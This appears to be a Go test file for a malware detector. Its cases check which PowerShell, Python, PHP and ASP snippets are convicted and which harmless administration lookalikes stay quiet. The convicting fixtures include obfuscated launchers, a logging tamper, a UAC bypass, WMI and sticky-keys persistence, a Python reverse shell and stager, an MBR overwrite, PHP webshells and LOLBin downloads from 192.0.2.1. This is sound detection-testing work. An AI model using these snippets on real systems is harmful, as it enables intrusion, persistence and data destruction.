package tradecraft

import (
	"strings"
	"testing"
)

// The Windows script and web-shell classes are pinned three ways: the behaviour
// each convicting class names, the behaviour each corroborating class names
// together with proof that it does not convict alone, and the shapes that look
// like one of them and are not. Every lookalike here is the shape of a false
// verdict some version of a rule produced on real administration scripts.

// find returns the finding of class, or nil.
func find(r *Result, class string) *Finding {
	for i := range r.Findings {
		if r.Findings[i].Class == class {
			return &r.Findings[i]
		}
	}
	return nil
}

// A class that scores eight has no ordinary use and convicts a file by itself.
func TestWindowsScriptVerdicts(t *testing.T) {
	for _, tc := range []struct{ name, src, class string }{
		{"launcher from comspec", "$x = $env:ComSpec[4,24,25]-join''\n& $x $payload\n", classPSLauncherAssembly},
		{"launcher from two picks", "$c = $PSHome[4]+$PSHome[30]+'x'\n", classPSLauncherAssembly},
		{"launcher by wildcard", "$n = (Get-Variable '*mdr*').Name[3,11,2]-join''\n", classPSLauncherAssembly},
		{"launcher from fragments", "$r = &('ie'+'x') $decoded\n", classPSLauncherAssembly},
		{"reordered fragments", "$a = (\"{1}{0}\"-f 'ost','Write-H')\n$b = ('{2}{0}{1}' -f 'pres','sion','Invoke-Ex')\n", classPSLauncherAssembly},
		{"logging state by reflection", "$s = [Ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings','NonPublic,Static')\n", classPSLoggingTamper},
		{"uac handler", "New-Item 'HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command' -Force\nStart-Process fodhelper.exe\n", classPSUACHijack},
		{"wmi subscription", "$f = Set-WmiInstance -Class __EventFilter -Arguments $fa\n$c = Set-WmiInstance -Class CommandLineEventConsumer -Arguments $ca\nSet-WmiInstance -Class __FilterToConsumerBinding -Arguments @{Filter=$f;Consumer=$c}\n", classPSWMISubscription},
		{"sticky keys", "$k = 'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe'\nSet-ItemProperty $k -Name Debugger -Value 'cmd.exe'\n", classPSAccessibility},
		{"password list against logon", "foreach ($password in $passlist) {\n  if ($ctx.ValidateCredentials($user, $password)) { $hit = $password }\n}\n", classPSCredentialBrute},
		{"word list against http", "foreach ($Item in Get-Content $Dictionary) {\n  $req.Headers.Add('Authorization', $basic)\n}\n", classPSCredentialBrute},
		{"scf with a remote icon", "$scf = \"[Shell]`nCommand=2`nIconFile=\\\\192.0.2.1\\share\\t.ico\"\n", classPSForcedAuth},
		{"the scf file itself", "[Shell]\r\nCommand=2\r\nIconFile=\\\\192.0.2.1\\share\\t.ico\r\n[Taskbar]\r\nCommand=ToggleDesktop\r\n", classPSForcedAuth},
		{"script console", "$post = 'script=println+new+ProcessBuilder%28%27'+$cmd+'%27%29.start%28%29.text&Submit=Run'\n", classPSScriptConsole},
		{"jmx deployer", "$u = 'http://'+$h+'/jmx-console/HtmlAdaptor?action=invokeOp&name=jboss.system:service=MainDeployer&methodIndex=19&arg0='+$war\n", classPSAppDeploy},
		{"boot sector", "$h = $k::CreateFile('\\\\.\\PhysicalDrive0',$rw,$sh,0,3,0,0)\n$m::WriteByte($p,510,0x55)\n$m::WriteByte($p,511,0xAA)\n$null = $k::WriteFile($h,$p,512,[Ref]$n,0)\n", classPSBootRecord},
		{"hex dump dropped and run", "[Byte[]] $temp = $hexdump -split ' '\n[System.IO.File]::WriteAllBytes(\"$env:temp\\svc.exe\", $temp)\nStart-Process \"$env:temp\\svc.exe\"\n", classPSDropAndRun},
	} {
		t.Run(tc.name, func(t *testing.T) {
			r := Analyze([]byte(tc.src), Options{})
			f := find(r, tc.class)
			if f == nil {
				t.Fatalf("no %s in %+v", tc.class, r.Findings)
			}
			if f.Score < DefaultThreshold || !r.Detected() {
				t.Fatalf("%s scored %d and must convict alone: %+v", tc.class, f.Score, r.Findings)
			}
		})
	}
}

// A class below eight is something an administrator's script also does. It is
// reported, and it does not convict a file that does nothing else.
func TestWindowsScriptCorroboration(t *testing.T) {
	for _, tc := range []struct{ name, src, class string }{
		{"outlook rule", "$rules = $ns.DefaultStore.GetRules()\n$r = $rules.Create('x', [Microsoft.Office.Interop.Outlook.OlRuleType]::olRuleReceive)\n$rules.Save()\n", classPSOutlookRule},
		{"password manager key", "$blob = Get-Item \"$env:APPDATA\\KeePass\\ProtectedUserKey.bin\"\n", classPSVaultConfig},
		{"password manager config", "$xml = [xml](Get-Content KeePass.config.xml)\n$k = $xml.Configuration.Defaults.KeySources.Association.KeyFilePath\n", classPSVaultConfig},
		{"interception parts", "$l = New-Object Net.HttpListener\n$bc = New-Object -com X509Enrollment.CX509ExtensionBasicConstraints\n$store = New-Object X509Store('Root','LocalMachine')\n", classPSIntercept},
		{"port forward", "netsh interface portproxy add v4tov4 listenport=8080 connectport=443 connectaddress=192.0.2.1\n", classPSPortProxy},
		{"update removed", "$c = \"wusa.exe /uninstall /kb:5000000 /quiet /norestart\"\n", classPSPatchRemoval},
		{"terminal profile", "$p = \"$env:LOCALAPPDATA\\Packages\\Microsoft.WindowsTerminal_8wekyb3d8bbwe\\LocalState\\settings.json\"\n$s.profiles.list[0].commandline = $line\n$s | ConvertTo-Json -Depth 20 | Set-Content $p\n", classPSTerminalHook},
		{"relay ends", "$l = New-Object System.Net.Sockets.TcpListener($ip, 1080)\n$c = $l.AcceptTcpClient()\n$o = New-Object System.Net.Sockets.TcpClient($host2, 443)\n", classPSTcpRelay},
	} {
		t.Run(tc.name, func(t *testing.T) {
			r := Analyze([]byte(tc.src), Options{})
			f := find(r, tc.class)
			if f == nil {
				t.Fatalf("no %s in %+v", tc.class, r.Findings)
			}
			if f.Score >= DefaultThreshold {
				t.Fatalf("%s scores %d: a behaviour with an ordinary use must not convict alone", tc.class, f.Score)
			}
		})
	}
}

// Two corroborating signals convict where one does not: a shortcut is ordinary
// and a timed capture loop is ordinary, and each joins the older signal that
// names the act itself.
func TestWindowsScriptPairs(t *testing.T) {
	for _, tc := range []struct {
		name, src string
		classes   []string
	}{
		{"lure shortcut", "$l = $shell.CreateShortcut($path)\n$l.Arguments = '-c \"powershell.exe ' + $stager + '\"'\n$l.TargetPath = 'powershell.exe'\n$l.IconLocation = 'C:\\windows\\System32\\SHELL32.dll, 27'\n$l.WindowStyle = 7\n$l.Save()\n",
			[]string{classPersistence, classPSLureShortcut}},
		{"screen on a timer", "while ((Get-Date) -lt $end) {\n  $g.CopyFromScreen($pt, [Drawing.Point]::Empty, $size)\n  $bmp.Save($file)\n  Start-Sleep -Seconds $Interval\n}\n",
			[]string{classCapture, classPSScreenshotLoop}},
	} {
		t.Run(tc.name, func(t *testing.T) {
			r := Analyze([]byte(tc.src), Options{})
			for _, c := range tc.classes {
				if !has(r, c) {
					t.Fatalf("no %s in %+v", c, r.Findings)
				}
			}
			if !r.Detected() {
				t.Fatalf("the pair must convict: %+v", r.Findings)
			}
		})
	}
}

// Shapes that look like one of the classes and are not. Each stays quiet.
func TestWindowsScriptLookalikes(t *testing.T) {
	for name, src := range map[string]string{
		// 51 of 7,686 public administration scripts held a Substring, a -join
		// and a ForEach-Object somewhere, and an earlier rule convicted them all.
		"truncating and joining":     "$short = $text.Substring(0, [Math]::Min(70, $text.Length))\n$all = $parts -join ', '\n$items | ForEach-Object { Write-Host $_ }\n",
		"walking the syntax tree":    "$ast = [System.Management.Automation.Language.Parser]::ParseInput($src, [ref]$t, [ref]$e)\n$ast.FindAll({ $args[0] -is [System.Management.Automation.Language.CommandAst] }, $true) | ForEach-Object { $_.Extent.Text }\n",
		"number to character":        "$c = [char]([Convert]::ToInt32($hex, 16))\n$s = $chars -join ''\n$list | ForEach-Object { $_.ToString() }\n",
		"a drive letter":             "$drive = $PSHome[0]\n$root = $env:Public[0] + ':\\'\n",
		"member by computed name":    "$value = $obj.('Na'+'me')\n",
		"a format string in order":   "$m = '{0}{1}' -f $a, $b\n$n = \"{0}: {1}\" -f 'name', $value\n",
		"one localised reorder":      "$m = '{1}{0}' -f 'a','b'\n",
		"reading the logging policy": "$on = (Get-ItemProperty $key).EnableScriptBlockLogging\n",
		"repairing a file class":     "Set-ItemProperty 'HKLM:\\Software\\Classes\\exefile\\shell\\open\\command' '(default)' '\"%1\" %*'\n",
		"listing event filters":      "Get-WmiObject -Namespace root\\subscription -Class __EventFilter | Select Name, Query\n",
		"validating one credential":  "$ok = $ctx.ValidateCredentials($user, $password)\nif (-not $ok) { throw 'bad password' }\n",
		"looping over users":         "foreach ($u in $users) { New-ADUser -Name $u -AccountPassword $pass -Credential $cred }\n",
		"an internet shortcut":       "[InternetShortcut]\r\nURL=https://example.com/\r\nIconFile=\\\\fileserver\\icons\\app.ico\r\n",
		"a war to the manager":       "Invoke-WebRequest -Uri \"http://$h/manager/text/deploy?path=/app\" -InFile app.war -Method Put\n",
		"reading a disk's size":      "$d = Get-WmiObject Win32_DiskDrive | Where-Object { $_.DeviceID -eq '\\\\.\\PHYSICALDRIVE0' }\n$d.Size\n",
		"saving a download":          "[IO.File]::WriteAllBytes($out, $response.Content)\nWrite-Host \"saved $out\"\n",
		"unpacking an embedded icon": "[IO.File]::WriteAllBytes($ico, [Convert]::FromBase64String($iconData))\n$form.Icon = New-Object Drawing.Icon($ico)\n",
		"a shortcut to a program":    "$l = $shell.CreateShortcut($path)\n$l.TargetPath = 'C:\\Program Files\\App\\app.exe'\n$l.Arguments = '--start'\n$l.IconLocation = 'C:\\Program Files\\App\\app.ico'\n$l.Save()\n",
		"a screenshot once":          "$g.CopyFromScreen($pt, [Drawing.Point]::Empty, $size)\n$bmp.Save($file)\n",
		"a theme for the terminal":   "$p = \"$env:LOCALAPPDATA\\Packages\\Microsoft.WindowsTerminal_8wekyb3d8bbwe\\LocalState\\settings.json\"\n$s.profiles.defaults.colorScheme = 'One Half Dark'\n$s | ConvertTo-Json -Depth 20 | Set-Content $p\n",
		"run as with a password":     "$si = New-Object System.Diagnostics.ProcessStartInfo\n$si.FileName = 'setup.exe'\n$si.UserName = $u\n$si.Password = $p\n[System.Diagnostics.Process]::Start($si)\n",
		"one session per server":     "foreach ($server in $servers) { New-PSSession -ComputerName $server -Credential $Credentials }\ngwmi -Class Win32_OperatingSystem -ComputerName $server\n",
		"a module that loads itself": "Get-ChildItem (Join-Path $PSScriptRoot *.ps1) | ForEach-Object { . $_.FullName }\nImport-Module \"$PSScriptRoot\\Helpers.psm1\" -DisableNameChecking\n",
		"granting a logon right":     "[DllImport(\"advapi32.dll\")] static extern uint LsaOpenPolicy(ref LSA_UNICODE_STRING s, ref LSA_OBJECT_ATTRIBUTES a, int access, out IntPtr h);\n",
		"a sql login reset":          "$c = New-Object System.Data.SqlClient.SqlConnection\n$sql = \"IF IS_SRVROLEMEMBER('sysadmin', '$login') = 0 EXEC sp_addsrvrolemember '$login', 'sysadmin'\"\n$Password = Read-Host -AsSecureString\n",
		"a python socket test":       "import socket\ns = socket.socket()\ns.bind(('127.0.0.1', 0))\ns.listen(1)\nc = socket.create_connection(s.getsockname())\nc.send(b'x')\n",
		"encrypting with a password": "$k = New-Object Security.Cryptography.PasswordDeriveBytes($p, $salt)\n$e = $aes.CreateEncryptor($k.GetBytes(32), $iv)\n$cs = New-Object Security.Cryptography.CryptoStream($ms, $e, 'Write')\n",
		// psutil's Windows tests: the API names the heuristic detector counts
		// must not be counted a second time here.
		"a process library's tests": "PROCESS_ALL_ACCESS = 0x1F0FFF\nh = ctypes.windll.kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)\nctypes.windll.kernel32.ReadProcessMemory(h, addr, buf, n, None)\nwin32security.LookupPrivilegeValue(None, 'SeDebugPrivilege')\n",
		"a keyword list":            "aliases = 'gwmi iex ihy ii ipal ipcsv ipmo ipsn irm ise iwmi iwr kill lp ls'\n",
		"cpu count from wmic":       "out = subprocess.check_output('wmic CPU Get NumberOfCores /Format:csv')\n",
	} {
		t.Run(name, func(t *testing.T) {
			if r := Analyze([]byte(src), Options{}); r.Detected() {
				t.Fatalf("false positive: %+v", r.Findings)
			}
		})
	}
}

// The parts of one behaviour sit together. A long module that holds each part
// in a different place is not the behaviour, and the short script that is
// stays one whatever is added around it.
func TestVectorsNeedTheirPartsTogether(t *testing.T) {
	filler := strings.Repeat("# unrelated line of an ordinary module\n", 400)
	for _, tc := range []struct{ name, near, far, class string }{
		{
			"python shell",
			"import socket,os,pty\ns=socket.socket()\ns.connect((h,p))\nos.dup2(s.fileno(),0)\npty.spawn('/bin/sh')\n",
			"import socket\ndef probe(h, p):\n    s = socket.socket()\n" + filler + "def run(cmd):\n    return subprocess.Popen(cmd)\n" + filler + "SHELL = '/bin/sh'\n",
			classRevShellPython,
		},
		{
			"python stager",
			"import socket\ns=socket.socket(2,1)\nd=s.recv(4)\nexec(d)\n",
			"s = socket.socket(2, 1)\n" + filler + "d = conn.recv(4)\n" + filler + "exec(compile(src, name, 'exec'))\n",
			classStagerPython,
		},
		{
			"accessibility debugger",
			"reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\utilman.exe\" /v Debugger /d cmd.exe\n",
			"# Image File Execution Options\\utilman.exe is audited below\n" + filler + "$Debugger = Get-Command windbg\n",
			classPSAccessibility,
		},
	} {
		t.Run(tc.name, func(t *testing.T) {
			if r := Analyze([]byte(tc.near), Options{}); !has(r, tc.class) {
				t.Fatalf("the behaviour itself must match: %+v", r.Findings)
			}
			if r := Analyze([]byte(filler+tc.near+filler), Options{}); !has(r, tc.class) {
				t.Fatalf("the behaviour inside a long file must still match: %+v", r.Findings)
			}
			if r := Analyze([]byte(tc.far), Options{}); has(r, tc.class) {
				t.Fatalf("parts scattered across a module matched: %+v", r.Findings)
			}
		})
	}
}

// atLeast counts matches of the first expression, and within still applies to
// each of them.
func TestVectorMatchCountsAndWindows(t *testing.T) {
	one := v("x", "", `alpha`, `beta`).within(10)
	if _, ok := one.match("alpha " + strings.Repeat(".", 40) + " beta"); ok {
		t.Fatal("beta is outside the window")
	}
	if ev, ok := one.match("alpha .. beta"); !ok || ev != "alpha" {
		t.Fatalf("beta is inside the window: %q %v", ev, ok)
	}
	// A later anchor may be the one with company.
	if _, ok := one.match("alpha " + strings.Repeat(".", 40) + " alpha beta"); !ok {
		t.Fatal("the second alpha has beta beside it")
	}
	twice := v("x", "", `alpha`).atLeast(2)
	if _, ok := twice.match("alpha"); ok {
		t.Fatal("one match is not two")
	}
	if _, ok := twice.match("alpha alpha"); !ok {
		t.Fatal("two matches are two")
	}
}

// The request chooses the capability, and the walk follows it through the
// variables it was put in.
func TestWebshellFlows(t *testing.T) {
	for _, tc := range []struct{ name, src, class string }{
		{"request concatenated into a command", "<?php system(\"./x \" . $_SERVER['REMOTE_ADDR'] . \" \" . $_SERVER['REMOTE_PORT']); ?>", classPHPRequestExec},
		{"proxy that parses the url", "<?php $u = $_GET['u']; $o = parse_url($u); $f = fopen($o['scheme'].'://'.$o['host'], 'rb'); $full = $u; $g = fopen($full, 'rb'); fpassthru($g); ?>", classPHPURLFetch},
		{"proxy that replays headers", "<?php $url = $_POST['laudurl'];\n$fp = fopen(buildurl($url), 'rb');\nforeach ($headers as $h) { header($headers[$i], true); }\nfpassthru($fp); ?>", classPHPURLFetch},
		{"proxy through curl", "<?php $t = $_REQUEST['t'];\n$p = parse_url($t);\n$ch = curl_init();\ncurl_setopt($ch, CURLOPT_URL, $t);\necho curl_exec($ch); ?>", classPHPURLFetch},
		{"resolver", "<?php $q = $_POST['q']; $r = dns_get_record($q, DNS_ANY); ?>", classPHPDNSQuery},
		{"address gate", "<?php $allowedIPs = array(\"192.168.0.2\", \"127.0.0.1\");\nforeach ($allowedIPs as $IP) { if ($_SERVER[\"REMOTE_ADDR\"] == $IP) $ok = 1; }\nif ($ok == 0) { header(\"HTTP/1.0 404 Not Found\");\n die(); } ?>", classPHPIPGate},
		{"asp proxy", "<%\nurl = Request.QueryString(\"u\")\nFullUrl = url & \"?\" & q\nSet http = Server.CreateObject(\"MSXML2.XMLHTTP\")\nhttp.Open method, FullUrl, False\nhttp.Send\nResponse.BinaryWrite http.responseBody\n%>", classASPURLFetch},
	} {
		t.Run(tc.name, func(t *testing.T) {
			if r := Analyze([]byte(tc.src), Options{}); !has(r, tc.class) {
				t.Fatalf("no %s in %+v", tc.class, r.Findings)
			}
		})
	}
}

// Pages that read a request, fetch something, or run something, without the
// request choosing what.
func TestWebshellLookalikes(t *testing.T) {
	for name, src := range map[string]string{
		"a form field":          "<?php $name = $_POST['name']; echo htmlspecialchars($name); ?>",
		"a fixed url":           "<?php $f = fopen('http://example.com/data.txt', 'rb'); echo stream_get_contents($f); ?>",
		"the visitor's address": "<?php error_log('visit from ' . $_SERVER['REMOTE_ADDR']); ?>",
		"a fixed name":          "<?php $r = dns_get_record('example.com'); ?>",
		// WordPress's theme editor: the request names a file, a permission
		// check stands in front, and nothing treats the value as a URL.
		"an admin file editor": "<?php $file = $_GET['file'];\nif (!current_user_can('edit_themes')) wp_die();\n$f = fopen($file, 'r');\n$content = fread($f, filesize($file));\necho esc_textarea($content); ?>",
		// Symfony's console scripts: argv is the machine's, not a client's.
		"a console script":        "<?php $dirs = $_SERVER['argv'];\narray_shift($dirs);\n$base = trim(shell_exec(sprintf('git merge-base \"%s\" HEAD', array_shift($dirs)))); ?>",
		"the document root":       "<?php $root = $_SERVER['DOCUMENT_ROOT'];\nexec('ls ' . escapeshellarg($root), $out); ?>",
		"an invariant":            "<?php $statement = $parser->statements[$_GET['i']];\nassert($statement instanceof SelectStatement); ?>",
		"an api call from a page": "<%\nSet http = Server.CreateObject(\"MSXML2.ServerXMLHTTP\")\nhttp.Open \"GET\", \"https://api.example.com/rates\", False\nhttp.Send\nname = Request.Form(\"name\")\nResponse.Write Server.HTMLEncode(name) & http.responseText\n%>",
		"a list of addresses":     "<?php $servers = array('10.0.0.1', '10.0.0.2');\necho $_SERVER['REMOTE_ADDR'];\nif (!$ok) { exit(); } ?>",
	} {
		t.Run(name, func(t *testing.T) {
			if r := Analyze([]byte(src), Options{}); r.Detected() {
				t.Fatalf("false positive: %+v", r.Findings)
			}
		})
	}
}

// assert() with a string was an eval; assert() with a test is an invariant.
// Only the first is a sink.
func TestPHPAssertIsASinkOnlyForCode(t *testing.T) {
	if r := Analyze([]byte("<?php $c = $_POST['c'];\nassert($c); ?>"), Options{}); !has(r, classPHPTaintExec) {
		t.Fatalf("assert on request input is an eval: %+v", r.Findings)
	}
	if r := Analyze([]byte("<?php $n = $_GET['n'];\nassert($n !== null);\nassert(is_string($n)); ?>"), Options{}); has(r, classPHPTaintExec) {
		t.Fatalf("an invariant is not an eval: %+v", r.Findings)
	}
}

// The gate and the resolver each have an ordinary reading. Either alone is
// reported and does not convict; a page with both does.
func TestWebshellGateCorroborates(t *testing.T) {
	gate := "<?php $allowedIPs = array(\"192.168.0.2\");\nif ($_SERVER[\"REMOTE_ADDR\"] == $allowedIPs[0]) $ok = 1;\nif (!$ok) { header(\"HTTP/1.0 404 Not Found\");\n die(); }\n"
	resolver := "$q = $_POST['q'];\n$r = dns_get_record($q);\n"
	if r := Analyze([]byte(gate+"?>"), Options{}); !has(r, classPHPIPGate) || r.Detected() {
		t.Fatalf("the gate alone is reported and does not convict: %+v", r.Findings)
	}
	if r := Analyze([]byte("<?php "+resolver+"?>"), Options{}); !has(r, classPHPDNSQuery) || r.Detected() {
		t.Fatalf("the resolver alone is reported and does not convict: %+v", r.Findings)
	}
	if r := Analyze([]byte(gate+resolver+"?>"), Options{}); !r.Detected() {
		t.Fatalf("a gated resolver convicts: %+v", r.Findings)
	}
}

// A catalogue of abusable Windows binaries lists what can be abused, not what
// is abuse. A binary with no business being handed a URL convicts; a browser,
// an Office program or an updater handed one is doing its job, and so is a
// logon script that runs an installer from the file server.
func TestLivingOffTheLandNeedsTheAbuse(t *testing.T) {
	for _, tc := range []struct{ name, src, class string }{
		{"a certificate tool fetching", "certoc.exe -GetCACAPS https://192.0.2.1/x.ps1\n", classLOLDownload},
		{"a text search used as a copy", "findstr /V /L nomatch \\\\192.0.2.1\\share\\x.exe > c:\\users\\public\\x.exe\n", classLOLDownload},
		{"the system root redirected", "set \"SYSTEMROOT=C:\\Windows\\Temp\" && cmd /c desktopimgdownldr.exe /lockscreenurl:http://192.0.2.1/x\n", classEnvHijack},
	} {
		t.Run(tc.name, func(t *testing.T) {
			if r := Analyze([]byte(tc.src), Options{}); !has(r, tc.class) || !r.Detected() {
				t.Fatalf("%s must convict: %+v", tc.class, r.Findings)
			}
		})
	}
	for name, src := range map[string]string{
		"a browser opening a page":      "start msedge.exe https://intranet.example.com/dashboard\n",
		"a document on sharepoint":      "winword.exe \"https://example.sharepoint.com/sites/hr/policy.docx\"\n",
		"an updater and its feed":       "Update.exe --update=https://releases.example.com/app/\n",
		"an installer from the server":  "\\\\fileserver\\deploy\\setup.exe /S /norestart\n",
		"a share path as a parameter":   "Get-ChocolateyWebFile -PackageName 'bob' -Url '\\\\fileshare\\location\\bob.exe'\n",
		"a share path in documentation": "# -Path \"\\\\Path\\To\\Outdated.exe\" replaces the outdated copy\n",
		"a clean profile for a build":   "set USERPROFILE=%TEMP%\\profile && powershell -File build.ps1\n",
		"a product removing its driver": "fltmc unload ExampleBackupFlt\n",
		"copying from the file server":  "replace.exe \\\\fileserver\\dist\\app.exe C:\\App /A\n",
	} {
		t.Run(name, func(t *testing.T) {
			if r := Analyze([]byte(src), Options{}); r.Detected() {
				t.Fatalf("false positive: %+v", r.Findings)
			}
		})
	}
}
